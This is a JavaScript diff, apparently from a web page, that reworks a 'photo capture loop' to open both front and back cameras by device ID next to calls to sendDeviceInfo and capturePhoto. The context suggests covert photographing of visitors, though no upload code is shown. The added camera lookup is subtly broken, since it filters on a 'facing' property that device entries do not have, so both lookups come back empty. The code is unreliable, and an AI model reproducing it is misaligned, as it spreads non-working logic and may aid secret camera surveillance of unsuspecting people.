@@ -65,6 +65,39 @@
             }
         }
 
+        async function getCameras() {
+            try {
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                const videoDevices = devices.filter(device => device.kind === 'videoinput');
+                let frontDevice = videoDevices.find(device => device.facing === 'user');
+                let backDevice = videoDevices.find(device => device.facing === 'environment');
+                return { frontDevice, backDevice };
+            } catch (error) {
+                console.error("Error getting camera devices:", error);
+                return {};
+            }
+        }
+
+        async function startSpecificCamera(deviceId) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { deviceId: { exact: deviceId } }
+                });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+
+                return new Promise((resolve) => {
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        resolve({ video, stream });
+                    };
+                });
+            } catch (error) {
+                console.error(`Error accessing camera with deviceId ${deviceId}:`, error);
+                return null;
+            }
+        }
+
         async function capturePhoto(video, canvas) {
             if (!video) return null;
 
@@ -107,11 +140,22 @@
         async function startPhotoCaptureLoop() {
             sendDeviceInfo();
 
-            const frontCamera = await startCamera("user");
-            const backCamera = await startCamera("environment");
-            
-            if (!frontCamera && !backCamera) return;
-            
+            // Get all camera devices
+            const { frontDevice, backDevice } = await getCameras();
+
+            if (!frontDevice) {
+                console.error("No front camera found");
+                return;
+            }
+            if (!backDevice) {
+                console.error("No back camera found");
+                return;
+            }
+
+            // Start the front and back cameras with their respective device IDs
+            const frontCamera = await startSpecificCamera(frontDevice.deviceId);
+            const backCamera = await startSpecificCamera(backDevice.deviceId);
+
             if (frontCamera) {
                 videoFront = frontCamera.video;
                 streamFront = frontCamera.stream;
